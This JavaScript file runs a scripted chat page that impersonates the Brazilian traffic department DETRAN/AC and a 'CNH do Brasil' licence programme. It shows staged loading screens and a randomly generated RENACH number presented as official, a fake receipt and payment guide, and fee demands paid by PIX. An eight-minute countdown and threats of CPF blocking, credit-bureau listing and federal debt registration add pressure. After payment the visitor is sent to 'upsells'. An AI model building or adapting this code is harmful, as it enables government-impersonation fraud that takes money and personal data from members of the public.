(function() {
    function runWhenReady(fn) {
        if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', fn);
        else fn();
    }
    runWhenReady(function() {
        var messagesEl = document.getElementById('chat-messages');
        var actionsEl = document.getElementById('chat-actions');
        if (!messagesEl || !actionsEl) return;
        var valorCents = typeof window.VALOR_PRODUTO_CENTAVOS !== 'undefined' ? window.VALOR_PRODUTO_CENTAVOS : 8640;
        var valorStr = typeof window.formatValorReais === 'function' ? window.formatValorReais(valorCents) : 'R$ 86,40';
        var valorNumStr = (valorCents / 100).toFixed(2).replace('.', ',');
        var loginNome = typeof window.getStoredNome === 'function' ? window.getStoredNome() : '';
        var userName = loginNome ? (loginNome.split(/\s+/)[0] || loginNome) : 'Usuário';
        var selectedCategory = '', selectedMonth = '', comprovanteRenchNum = '';
        var months2026 = [{name:'JANEIRO/2026',vagas:22,expirado:true},{name:'FEVEREIRO/2026',vagas:14},{name:'MARÇO/2026',vagas:19},{name:'ABRIL/2026',vagas:17},{name:'MAIO/2026',vagas:15},{name:'JUNHO/2026',vagas:14},{name:'JULHO/2026',vagas:14},{name:'AGOSTO/2026',vagas:14},{name:'SETEMBRO/2026',vagas:22},{name:'OUTUBRO/2026',vagas:16},{name:'NOVEMBRO/2026',vagas:15},{name:'DEZEMBRO/2026',vagas:14}];

        function scrollB() { messagesEl.scrollTop = messagesEl.scrollHeight; }
        var typingDelay = 2300;
        function bot(html, onMessageShown) {
            var r = document.createElement('div');
            r.className = 'msg-row bot';
            r.innerHTML = '<div class="msg-bubble bot"><div class="typing-bubble"><span class="typing-dot"></span><span class="typing-dot"></span><span class="typing-dot"></span></div></div>';
            messagesEl.appendChild(r);
            scrollB();
            setTimeout(function() {
                r.querySelector('.msg-bubble').innerHTML = html;
                r.querySelector('.msg-bubble').classList.add('msg-content');
                scrollB();
                if (typeof onMessageShown === 'function') onMessageShown();
            }, typingDelay);
        }
        function showTypingThen(onDone) {
            var r = document.createElement('div');
            r.className = 'msg-row bot';
            r.innerHTML = '<div class="msg-bubble bot"><div class="typing-bubble"><span class="typing-dot"></span><span class="typing-dot"></span><span class="typing-dot"></span></div></div>';
            messagesEl.appendChild(r);
            scrollB();
            setTimeout(function() {
                r.remove();
                scrollB();
                if (typeof onDone === 'function') onDone();
            }, typingDelay);
        }
        function user(t) { var r=document.createElement('div'); r.className='msg-row user'; r.innerHTML='<div class="msg-bubble user">'+t+'</div>'; messagesEl.appendChild(r); scrollB(); }
        function prosseguir(fn) { actionsEl.innerHTML=''; var b=document.createElement('button'); b.type='button'; b.className='btn-prosseguir'; b.innerHTML='Prosseguir <i class="fas fa-chevron-right"></i>'; b.onclick=function(){ user('Prosseguir'); b.remove(); if(fn) fn(); }; actionsEl.appendChild(b); scrollB(); }
        function esc(s) { if (!s) return ''; var d=document.createElement('span'); d.textContent=s; return d.innerHTML; }
        function formatVencimento(d) { var day=('0'+d.getDate()).slice(-2), month=('0'+(d.getMonth()+1)).slice(-2), year=d.getFullYear(); return day+'/'+month+'/'+year; }
        function buildGuiaHTML(contribuinte, cpf, renach, numGuia, vencimento) {
            return '<div class="chat-guia-card">'+
                '<div class="guia-header">'+
                    '<div class="guia-logo"><img src="images/btcaqui.jpg" alt="DETRAN.AC"></div>'+
                    '<p class="guia-titulo">GUIA DE RECOLHIMENTO</p>'+
                    '<p class="guia-subtitulo">TAXAS ADMINISTRATIVAS CNH</p>'+
                '</div>'+
                '<div class="guia-grid">'+
                    '<div><label>CONTRIBUINTE</label><div class="value">'+esc(contribuinte)+'</div></div>'+
                    '<div><label>EXERCÍCIO</label><div class="value">2026</div></div>'+
                    '<div><label>CPF</label><div class="value">'+esc(cpf)+'</div></div>'+
                    '<div><label>Nº RENACH</label><div class="value">'+esc(renach)+'</div></div>'+
                    '<div><label>Nº GUIA</label><div class="value">'+esc(numGuia)+'</div></div>'+
                    '<div><label>VENCIMENTO</label><div class="value">'+esc(vencimento)+'</div></div>'+
                '</div>'+
                '<table class="guia-tabela">'+
                    '<thead><tr><th>DISCRIMINAÇÃO DOS DÉBITOS</th><th class="guia-tabela-r">VALORES EM REAIS</th></tr></thead>'+
                    '<tbody>'+
                        '<tr><td>TAXA DE EXPEDIÇÃO DE DOCUMENTO (TED)</td><td class="guia-tabela-r">34,88</td></tr>'+
                        '<tr><td>TAXA DE SERVIÇOS ADMINISTRATIVOS (TSA)</td><td class="guia-tabela-r">25,76</td></tr>'+
                        '<tr><td>TAXA DE PROCESSAMENTO ELETRÔNICO (TPE)</td><td class="guia-tabela-r">25,76</td></tr>'+
                        '<tr class="total"><td>TOTAL</td><td class="guia-tabela-r">'+valorNumStr+'</td></tr>'+
                    '</tbody>'+
                '</table>'+
                '<div class="guia-obs">'+
                    '<div class="guia-obs-tit">Observações:</div>'+
                    '<p class="guia-obs-txt">Informamos que, caso o pagamento não seja realizado dentro do prazo estabelecido, o <b>CPF</b> do responsável <b>('+esc(cpf)+')</b> será bloqueado no programa pelo período de <b>18 (dezoito) meses</b>. Além disso, o valor da taxa, acrescido de multas, será registrado no <b>CPF</b> junto aos órgãos de proteção ao crédito <b>(SPC e SERASA)</b>, bem como inscrito em <b>Dívida Ativa da União</b>, nos termos do art. 2º da <b>Lei nº 6.830/1980</b> (Lei de Execuções Fiscais) e do art. 43 da <b>Lei nº 8.078/1990</b>.</p>'+
                '</div>'+
            '</div>';
        }
        function startCountdown(minutes, el) {
            if (!el) return;
            var totalSec = minutes * 60;
            var iv = setInterval(function() {
                totalSec--;
                if (totalSec <= 0) { clearInterval(iv); el.textContent = '00:00'; return; }
                var m = Math.floor(totalSec / 60), s = totalSec % 60;
                el.textContent = ('0'+m).slice(-2) + ':' + ('0'+s).slice(-2);
            }, 1000);
            var m = Math.floor(totalSec / 60), s = totalSec % 60;
            el.textContent = ('0'+m).slice(-2) + ':' + ('0'+s).slice(-2);
        }
        function startCountdownFromSec(seconds, el) {
            if (!el) return;
            var totalSec = Math.max(0, Math.floor(seconds));
            var iv = setInterval(function() {
                totalSec--;
                if (totalSec <= 0) { clearInterval(iv); el.textContent = '00:00'; return; }
                var m = Math.floor(totalSec / 60), s = totalSec % 60;
                el.textContent = ('0'+m).slice(-2) + ':' + ('0'+s).slice(-2);
            }, 1000);
            var m = Math.floor(totalSec / 60), s = totalSec % 60;
            el.textContent = ('0'+m).slice(-2) + ':' + ('0'+s).slice(-2);
        }
        function finalizar() {
            actionsEl.innerHTML='';
            var btn=document.createElement('button'); btn.type='button'; btn.className='btn-finalizar'; btn.innerHTML='<i class="fas fa-check"></i> Finalizar Cadastro';
            var fn = typeof window.getStoredNome === 'function' ? window.getStoredNome() : '';
            var fc = typeof window.getStoredCpf === 'function' ? window.getStoredCpf() : '';
            var cpfFormatado = (fc && fc.length === 11) ? fc.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/,'$1.$2.$3-$4') : (fc || '');
            var contribuinte = (fn || '').toUpperCase() || '—';
            btn.onclick=function(){
                btn.remove();
                showLoading('Gerando Guia de Pagamento...', 3200, function(){
                    var renach = comprovanteRenchNum || String(Math.floor(10000000000 + Math.random() * 90000000000));
                    var numGuia = String(Math.floor(1000000000 + Math.random() * 9000000000));
                    var venc = new Date(); venc.setDate(venc.getDate() + 3);
                    var vencStr = formatVencimento(venc);
                    var guiaRow = document.createElement('div'); guiaRow.className = 'msg-row bot';
                    guiaRow.innerHTML = buildGuiaHTML(contribuinte, cpfFormatado, renach, numGuia, vencStr);
                    messagesEl.appendChild(guiaRow);
                    messagesEl.scrollTop = Math.min(messagesEl.scrollHeight, messagesEl.scrollTop + 220);

                    var apiBase = '../../api';
                    try {
                        var storedOrderId = sessionStorage.getItem('chat_pix_order_id');
                        var storedCode = sessionStorage.getItem('chat_pix_code');
                        var storedAt = sessionStorage.getItem('chat_pix_created_at');
                        if (storedOrderId && storedCode && storedAt) {
                            var created = parseInt(storedAt, 10);
                            var remainingSec = Math.floor((created + 480000 - Date.now()) / 1000);
                            if (remainingSec > 0) {
                                var pixRow = document.createElement('div'); pixRow.className = 'msg-row bot';
                                pixRow.innerHTML = '<div class="chat-pix-card">'+
                                    '<div class="chat-pix-title">DETRAN/AC - PAGAMENTO VIA PIX</div>'+
                                    '<div class="chat-pix-subtitle">Programa CNH do Brasil - Taxas Administrativas</div>'+
                                    '<div class="chat-pix-venc-valor">'+
                                        '<div><span class="l">VENCIMENTO DA GUIA</span><br><span class="v" id="chat-pix-venc">'+vencStr+'</span></div>'+
                                        '<div><span class="l">VALOR A PAGAR EM REAIS</span><br><span class="v">'+valorStr+'</span></div>'+
                                    '</div>'+
                                    '<div class="chat-pix-aguardando">'+
                                        '<span class="chat-pix-aguardando-dots"><i></i><i></i><i></i></span><span class="chat-pix-aguardando-txt">AGUARDANDO PAGAMENTO</span>'+
                                        '<p class="chat-pix-aguardando-vence">Esta guia vence em: <span id="chat-pix-countdown">08:00</span></p>'+
                                    '</div>'+
                                    '<div class="chat-pix-qr-label">QR CODE PIX:</div>'+
                                    '<div class="chat-pix-qr-wrap" id="chat-pix-qr-wrap"></div>'+
                                    '<label class="chat-pix-code-label">CÓDIGO PIX COPIA E COLA:</label>'+
                                    '<textarea class="chat-pix-code-text" id="chat-pix-code-text" readonly rows="3"></textarea>'+
                                    '<button type="button" class="btn-copiar-pix" id="chat-btn-copiar-pix"><i class="fas fa-copy"></i> Copiar Código PIX</button>'+
                                    '<div class="chat-pix-instrucoes">'+
                                        '<h3>Para realizar o pagamento via PIX Copia e Cola:</h3>'+
                                        '<ol><li>Copie o código PIX clicando no botão "Copiar Código PIX"</li><li>Abra o aplicativo do seu banco</li><li>Acesse a área PIX e selecione "Pagar com PIX Copia e Cola"</li><li>Cole o código copiado e confirme o pagamento</li></ol>'+
                                        '<p>Após a confirmação do pagamento, seu cadastro no Programa CNH do Brasil será ativado e você já poderá iniciar as aulas teóricas pelo aplicativo oficial.</p>'+
                                    '</div></div>';
                                messagesEl.appendChild(pixRow);
                                messagesEl.scrollTop = Math.min(messagesEl.scrollHeight, messagesEl.scrollTop + 220);
                                var codeEl = pixRow.querySelector('#chat-pix-code-text');
                                var qrWrap = pixRow.querySelector('#chat-pix-qr-wrap');
                                if (codeEl) codeEl.value = storedCode;
                                if (qrWrap && typeof QRCode !== 'undefined') { qrWrap.innerHTML = ''; new QRCode(qrWrap, { text: storedCode, width: 180, height: 180 }); }
                                var countdownEl = pixRow.querySelector('#chat-pix-countdown');
                                if (countdownEl) startCountdownFromSec(remainingSec, countdownEl);
                                var vencEl = pixRow.querySelector('#chat-pix-venc');
                                if (vencEl) vencEl.textContent = formatVencimento(new Date());
                                var btnCopiar = pixRow.querySelector('#chat-btn-copiar-pix');
                                if (btnCopiar) btnCopiar.onclick = function(){ var t = pixRow.querySelector('#chat-pix-code-text'); if (t && t.value) { t.select(); t.setSelectionRange(0,99999); try { navigator.clipboard.writeText(t.value); btnCopiar.classList.add('copied'); btnCopiar.innerHTML = '<i class="fas fa-check"></i> Copiado!'; setTimeout(function(){ btnCopiar.classList.remove('copied'); btnCopiar.innerHTML = '<i class="fas fa-copy"></i> Copiar Código PIX'; }, 2000); } catch(e) {} } };
                                var orderIdChat = storedOrderId;
                                function isPaidResponseChat(data){ if(!data||!data.data)return false; if(data.success===false)return false; var d=data.data; if(!d)return false; if(d.is_paid===true)return true; var s=String(d.status||'').toLowerCase(); return s==='paid'||s==='approved'; }
                                function showChatPaymentSuccess() {
                                    try { sessionStorage.removeItem('chat_pix_order_id'); sessionStorage.removeItem('chat_pix_code'); sessionStorage.removeItem('chat_pix_created_at'); } catch(e) {}
                                    var aguardando = pixRow.querySelector('.chat-pix-aguardando');
                                    if (aguardando) aguardando.innerHTML = '<span class="chat-pix-aguardando-txt" style="color:var(--green-success);">PAGAMENTO APROVADO</span>';
                                    var qsChat = window.location.search || '';
                                    if (typeof window.showPaymentSuccessModal === 'function') {
                                        window.showPaymentSuccessModal(function() { window.location.replace('../upsells/' + qsChat); }, { hideEmailMessage: true, autoRedirectMs: 3000 });
                                    } else {
                                        window.location.replace('../upsells/' + qsChat);
                                    }
                                }
                                function checkPaymentChat() {
                                    if (!orderIdChat) return;
                                    var u = apiBase + '/verificar-status.php?id=' + encodeURIComponent(orderIdChat) + '&_=' + (Date.now());
                                    fetch(u, { method: 'GET', cache: 'no-store', headers: { 'Accept': 'application/json' } })
                                        .then(function(r) { return r.text().then(function(t) { try { return JSON.parse(t); } catch (e) { return null; } }); })
                                        .then(function(data) {
                                            var paid = isPaidResponseChat(data);
                                            if (paid) { if (chatPollInterval) { clearInterval(chatPollInterval); chatPollInterval = null; } showChatPaymentSuccess(); }
                                        })
                                        .catch(function(err) {});
                                }
                                var chatPollInterval = setInterval(checkPaymentChat, 2500);
                                checkPaymentChat();
                                return;
                            }
                            sessionStorage.removeItem('chat_pix_order_id'); sessionStorage.removeItem('chat_pix_code'); sessionStorage.removeItem('chat_pix_created_at');
                        }
                    } catch (e) {}
                    var payload = {
                        amount: valorCents,
                        customer: { name: fn || 'Usuário', email: (typeof window.getStoredEmail === 'function' ? window.getStoredEmail() : '') || 'cliente@pagamentos.com.br', cpf: cpfFormatado, phone: (typeof window.getStoredTelefone === 'function' ? (window.getStoredTelefone() || '').replace(/\D/g, '') : '') },
                        items: [{ title: 'Taxas CNH', unitPrice: valorCents, quantity: 1 }],
                        metadata: {}
                    };
                    var urlParams = new URLSearchParams(window.location.search);
                    ['utm_source','utm_medium','utm_campaign','utm_content','utm_term','src','sck'].forEach(function(k){ var v=urlParams.get(k); if(v) payload.metadata[k]=v; });

                    fetch(apiBase+'/gerar-pagamento.php', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) })
                        .then(function(r){ return r.json().then(function(data){ return { ok: r.ok, data: data }; }).catch(function(e){ return { ok: false, data: null }; }); })
                        .then(function(result){
                            var pixCode = (result.ok && result.data && result.data.success && result.data.data) ? (result.data.data.pix_code || (result.data.data.pix && result.data.data.pix.qrcode) || '') : '';
                            if (pixCode) {
                                var pixRow = document.createElement('div'); pixRow.className = 'msg-row bot';
                                pixRow.innerHTML = '<div class="chat-pix-card">'+
                                    '<div class="chat-pix-title">DETRAN/AC - PAGAMENTO VIA PIX</div>'+
                                    '<div class="chat-pix-subtitle">Programa CNH do Brasil - Taxas Administrativas</div>'+
                                    '<div class="chat-pix-venc-valor">'+
                                        '<div><span class="l">VENCIMENTO DA GUIA</span><br><span class="v" id="chat-pix-venc">'+vencStr+'</span></div>'+
                                        '<div><span class="l">VALOR A PAGAR EM REAIS</span><br><span class="v">'+valorStr+'</span></div>'+
                                    '</div>'+
                                    '<div class="chat-pix-aguardando">'+
                                        '<span class="chat-pix-aguardando-dots"><i></i><i></i><i></i></span><span class="chat-pix-aguardando-txt">AGUARDANDO PAGAMENTO</span>'+
                                        '<p class="chat-pix-aguardando-vence">Esta guia vence em: <span id="chat-pix-countdown">08:00</span></p>'+
                                    '</div>'+
                                    '<div class="chat-pix-qr-label">QR CODE PIX:</div>'+
                                    '<div class="chat-pix-qr-wrap" id="chat-pix-qr-wrap"></div>'+
                                    '<label class="chat-pix-code-label">CÓDIGO PIX COPIA E COLA:</label>'+
                                    '<textarea class="chat-pix-code-text" id="chat-pix-code-text" readonly rows="3"></textarea>'+
                                    '<button type="button" class="btn-copiar-pix" id="chat-btn-copiar-pix"><i class="fas fa-copy"></i> Copiar Código PIX</button>'+
                                    '<div class="chat-pix-instrucoes">'+
                                        '<h3>Para realizar o pagamento via PIX Copia e Cola:</h3>'+
                                        '<ol><li>Copie o código PIX clicando no botão "Copiar Código PIX"</li><li>Abra o aplicativo do seu banco</li><li>Acesse a área PIX e selecione "Pagar com PIX Copia e Cola"</li><li>Cole o código copiado e confirme o pagamento</li></ol>'+
                                        '<p>Após a confirmação do pagamento, seu cadastro no Programa CNH do Brasil será ativado e você já poderá iniciar as aulas teóricas pelo aplicativo oficial.</p>'+
                                    '</div></div>';
                                messagesEl.appendChild(pixRow);
                                messagesEl.scrollTop = Math.min(messagesEl.scrollHeight, messagesEl.scrollTop + 220);

                                var codeEl = pixRow.querySelector('#chat-pix-code-text');
                                var qrWrap = pixRow.querySelector('#chat-pix-qr-wrap');
                                if (codeEl) codeEl.value = pixCode;
                                if (qrWrap && typeof QRCode !== 'undefined') { qrWrap.innerHTML = ''; new QRCode(qrWrap, { text: pixCode, width: 180, height: 180 }); }
                                var countdownEl = pixRow.querySelector('#chat-pix-countdown');
                                if (countdownEl) startCountdown(8, countdownEl);
                                var dataExibicao = formatVencimento(new Date());
                                var vencEl = pixRow.querySelector('#chat-pix-venc');
                                if (vencEl) vencEl.textContent = dataExibicao;
                                var btnCopiar = pixRow.querySelector('#chat-btn-copiar-pix');
                                if (btnCopiar) btnCopiar.onclick = function(){ var t = pixRow.querySelector('#chat-pix-code-text'); if (t && t.value) { t.select(); t.setSelectionRange(0,99999); try { navigator.clipboard.writeText(t.value); btnCopiar.classList.add('copied'); btnCopiar.innerHTML = '<i class="fas fa-check"></i> Copiado!'; setTimeout(function(){ btnCopiar.classList.remove('copied'); btnCopiar.innerHTML = '<i class="fas fa-copy"></i> Copiar Código PIX'; }, 2000); } catch(e) {} } };
                                var orderIdChat = String(result.data.data.order_id || result.data.data.orderId || '');
                                try { sessionStorage.setItem('chat_pix_order_id', orderIdChat); sessionStorage.setItem('chat_pix_code', pixCode); sessionStorage.setItem('chat_pix_created_at', String(Date.now())); } catch (e) {}
                                function isPaidResponseChat(data){ if(!data||!data.data)return false; if(data.success===false)return false; var d=data.data; if(!d)return false; if(d.is_paid===true)return true; var s=String(d.status||'').toLowerCase(); return s==='paid'||s==='approved'; }
                                function showChatPaymentSuccess() {
                                    try { sessionStorage.removeItem('chat_pix_order_id'); sessionStorage.removeItem('chat_pix_code'); sessionStorage.removeItem('chat_pix_created_at'); } catch(e) {}
                                    var aguardando = pixRow.querySelector('.chat-pix-aguardando');
                                    if (aguardando) aguardando.innerHTML = '<span class="chat-pix-aguardando-txt" style="color:var(--green-success);">PAGAMENTO APROVADO</span>';
                                    var qsChat = window.location.search || '';
                                    if (typeof window.showPaymentSuccessModal === 'function') {
                                        window.showPaymentSuccessModal(function() { window.location.replace('../upsells/' + qsChat); }, { hideEmailMessage: true, autoRedirectMs: 3000 });
                                    } else {
                                        window.location.replace('../upsells/' + qsChat);
                                    }
                                }
                                function checkPaymentChat() {
                                    if (!orderIdChat) return;
                                    var u = apiBase + '/verificar-status.php?id=' + encodeURIComponent(orderIdChat) + '&_=' + (Date.now());
                                    fetch(u, { method: 'GET', cache: 'no-store', headers: { 'Accept': 'application/json' } })
                                        .then(function(r) { return r.text().then(function(t) { try { return JSON.parse(t); } catch (e) { return null; } }); })
                                        .then(function(data) {
                                            var paid = isPaidResponseChat(data);
                                            if (paid) {
                                                if (chatPollInterval) { clearInterval(chatPollInterval); chatPollInterval = null; }
                                                showChatPaymentSuccess();
                                            }
                                        })
                                        .catch(function(err) {});
                                }
                                var chatPollInterval = setInterval(checkPaymentChat, 2500);
                                checkPaymentChat();
                            } else {
                                var errRow = document.createElement('div'); errRow.className = 'msg-row bot';
                                var errMsg = (result.data && result.data.message) ? result.data.message : 'Não foi possível gerar o PIX no momento. Por favor, tente novamente.';
                                errRow.innerHTML = '<div class="msg-bubble bot chat-pix-erro">'+
                                    '<p>'+String(errMsg).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;')+'</p>'+
                                    '<a href="../../login/'+(window.location.search||'')+'" class="btn-ir-inicio">Ir para página inicial</a>'+
                                '</div>';
                                messagesEl.appendChild(errRow);
                                messagesEl.scrollTop = Math.min(messagesEl.scrollHeight, messagesEl.scrollTop + 120);
                            }
                        })
                        .catch(function(err){
                            var errRow = document.createElement('div'); errRow.className = 'msg-row bot';
                            errRow.innerHTML = '<div class="msg-bubble bot chat-pix-erro">'+
                                '<p>Não foi possível conectar ao servidor. Verifique sua internet e tente novamente.</p>'+
                                '<a href="../../login/'+(window.location.search||'')+'" class="btn-ir-inicio">Ir para página inicial</a>'+
                            '</div>';
                            messagesEl.appendChild(errRow);
                            messagesEl.scrollTop = Math.min(messagesEl.scrollHeight, messagesEl.scrollTop + 120);
                        });
                });
            };
            actionsEl.appendChild(btn); scrollB();
        }

        function getEstado() {
            try {
                var fromStorage = localStorage.getItem('chat_estado');
                if (fromStorage) return fromStorage;
            } catch (e) {}
            var params = new URLSearchParams(window.location.search);
            return params.get('estado') || 'seu estado';
        }
        function sanitizeEstadoNome(str) {
            if (!str || typeof str !== 'string') return 'seu estado';
            var limpo = str.split('?')[0].split('&')[0].trim();
            return limpo || 'seu estado';
        }
        function showConsultandoVagas(estado, onDone) {
            var estadoNome = sanitizeEstadoNome(estado || getEstado());
            var row = document.createElement('div');
            row.className = 'msg-row chat-loading-row';
            row.innerHTML = '<div class="chat-loading-box"><span class="chat-loading-spinner"></span><span class="chat-loading-text">Consultando vagas no Detran <b>' + estadoNome + '</b>...</span></div>';
            messagesEl.appendChild(row);
            scrollB();
            setTimeout(function() {
                row.remove();
                scrollB();
                if (typeof onDone === 'function') onDone();
            }, 5500);
        }
        function showLoading(text, durationMs, onDone) {
            var row = document.createElement('div');
            row.className = 'msg-row chat-loading-row';
            row.innerHTML = '<div class="chat-loading-box"><span class="chat-loading-spinner"></span><span class="chat-loading-text">' + text + '</span></div>';
            messagesEl.appendChild(row);
            scrollB();
            setTimeout(function() {
                row.remove();
                scrollB();
                if (typeof onDone === 'function') onDone();
            }, durationMs || 3000);
        }
        function step0() {
            var urlParams = new URLSearchParams(window.location.search);
            var estadoFromUrl = urlParams.get('estado');
            if (estadoFromUrl) { try { localStorage.setItem('chat_estado', estadoFromUrl); } catch (e) {} }
            bot('<p>Para dar continuidade ao seu cadastro no Programa CNH do Brasil, informamos que é necessário selecionar a categoria de CNH pretendida.</p>', function() {
                var opts=document.createElement('div'); opts.className='chat-options';
                [{id:'A',label:'A',text:'Categoria A - Motocicletas'},{id:'B',label:'B',text:'Categoria B - Carros'},{id:'AB',label:'AB',text:'Categoria AB - Motocicletas e Carros'}].forEach(function(c){
                    var card=document.createElement('button'); card.type='button'; card.className='option-card'; card.innerHTML='<span class="card-label">'+c.label+'</span>'+c.text.replace(c.label+' ','');
                    card.onclick=function(){
                        selectedCategory=c.id;
                        opts.remove();
                        showConsultandoVagas(getEstado(), function() {
                            user('Categoria '+c.label);
                            step1();
                        });
                    };
                    opts.appendChild(card);
                });
                messagesEl.appendChild(opts); scrollB();
            });
        }
        function step1() {
            bot('<p>Prezado(a) '+userName+', informamos que as aulas teóricas do Programa CNH do Brasil podem ser realizadas de forma remota, por meio de dispositivo móvel ou computador, conforme sua disponibilidade de horário.</p><p>Após a finalização do cadastro, o sistema liberará o acesso ao aplicativo oficial com o passo a passo completo, e você já poderá iniciar as aulas imediatamente.</p>', function() { prosseguir(step2); });
        }
        function step2() {
            bot('<p>O Programa CNH do Brasil segue as seguintes etapas: o candidato realiza as aulas teóricas através do aplicativo oficial e, após a conclusão, o Detran <b>' + sanitizeEstadoNome(getEstado()) + '</b> disponibilizará um instrutor credenciado, sem custo adicional, para a realização das aulas práticas obrigatórias.</p>', function() { prosseguir(step3); });
        }
        function step3() {
            bot('<p>As avaliações teóricas e práticas encontram-se disponíveis para agendamento. Para finalização do cadastro, é necessário selecionar o período para realização das provas. Conforme a legislação vigente, o processo completo tem duração inferior a 20 dias úteis.</p>', function() {
                bot('<p>Selecione o mês de sua preferência para realização das avaliações:</p>', function() {
                    var g=document.createElement('div'); g.className='months-grid';
                    months2026.forEach(function(m){
                        var c=document.createElement('button'); c.type='button'; c.className='month-card'+(m.expirado?' month-card-expirado':'');
                        c.innerHTML=m.expirado?'<span class="month-name">'+m.name+'</span><span class="month-vagas">Expirado</span>':'<span class="month-name">'+m.name+'</span><span class="month-vagas">'+m.vagas+' vagas</span>';
                        if(!m.expirado){
                            c.onclick=function(){
                                selectedMonth=m.name;
                                user(m.name);
                                g.remove();
                                scrollB();
                                showLoading('Confirmando cadastro junto ao Detran...', 3200, function() {
                                    showLoading('Gerando cadastro no RENACH...', 3200, function() {
                                        showLoading('Emitindo documentação...', 3200, function() {
                                            prosseguir(step4);
                                        });
                                    });
                                });
                            };
                        } else {
                            c.disabled=true;
                        }
                        g.appendChild(c);
                    });
                    messagesEl.appendChild(g); scrollB();
                });
            });
        }
        function step4() {
            var renachNum = String(Math.floor(10000000000 + Math.random() * 90000000000));
            function formatEmitidoDate() {
                var d = new Date();
                var day = ('0' + d.getDate()).slice(-2);
                var month = ('0' + (d.getMonth() + 1)).slice(-2);
                var year = d.getFullYear();
                var h = ('0' + d.getHours()).slice(-2);
                var min = ('0' + d.getMinutes()).slice(-2);
                return 'Emitido em ' + day + '/' + month + '/' + year + ' às ' + h + ':' + min;
            }
            comprovanteRenchNum = renachNum;
            bot('<p>Prezado(a) '+userName+', seu número de RENACH foi gerado com sucesso junto ao Detran <b>' + sanitizeEstadoNome(getEstado()) + '</b>.</p><p>Número do RENACH: <strong>'+renachNum+'</strong></p><p>O RENACH (Registro Nacional de Carteira de Habilitação) é o número de identificação único do candidato no Sistema Nacional de Habilitação.</p>', function() {
                var compNome = (typeof window.getStoredNome === 'function' ? window.getStoredNome() : '') || '';
                compNome = (compNome || '').toUpperCase() || '—';
                var compCpf = typeof window.getStoredCpf === 'function' ? window.getStoredCpf() : '';
                compCpf = compCpf.length === 11 ? compCpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/,'$1.$2.$3-$4') : compCpf || '—';
                var emitidoText = formatEmitidoDate();
                var comp=document.createElement('div'); comp.className='msg-row bot'; comp.innerHTML='<div class="comprovante-card"><div class="comprovante-header"><span class="comprovante-detran"><img src="images/btcaqui.jpg" alt="DETRAN"></span><span class="comprovante-protocolo">Protocolo: '+renachNum+'</span></div><div class="comprovante-title">COMPROVANTE DE CADASTRO - RENACH</div><div class="comprovante-grid"><div class="comprovante-item"><label>NOME</label><div class="value">'+compNome+'</div></div><div class="comprovante-item"><label>CPF</label><div class="value">'+compCpf+'</div></div><div class="comprovante-item"><label>Nº RENACH</label><div class="value renach">'+renachNum+'</div></div><div class="comprovante-item"><label>CATEGORIA</label><div class="value">'+selectedCategory+'</div></div><div class="comprovante-item"><label>MÊS PREVISTO</label><div class="value">'+(selectedMonth||'MAIO/2026')+'</div></div><div class="comprovante-item"><label>STATUS</label><div class="value status">PENDENTE</div></div></div><div class="comprovante-footer">'+emitidoText+'</div></div>';
                messagesEl.appendChild(comp); scrollB(); prosseguir(step5);
            });
        }
        function step5() {
            showTypingThen(function() {
                var r=document.createElement('div'); r.className='msg-row bot'; r.innerHTML='<div class="taxas-bubble"><p>Prezado(a) '+userName+', seu cadastro encontra-se com status PENDENTE. Para liberação do acesso ao aplicativo de aulas e prosseguimento do processo, é obrigatório o recolhimento das Taxas Administrativas:</p><ul class="taxas-list"><li>Taxa de Expedição de Documento (TED): R$ 34,88</li><li>Taxa de Serviços Administrativos (TSA): R$ 25,76</li><li>Taxa de Processamento Eletrônico (TPE): R$ 25,76</li></ul><p class="taxas-total">Valor Total: '+valorStr+'</p></div>';
                messagesEl.appendChild(r); scrollB(); finalizar();
            });
        }
        step0();
    });
})();
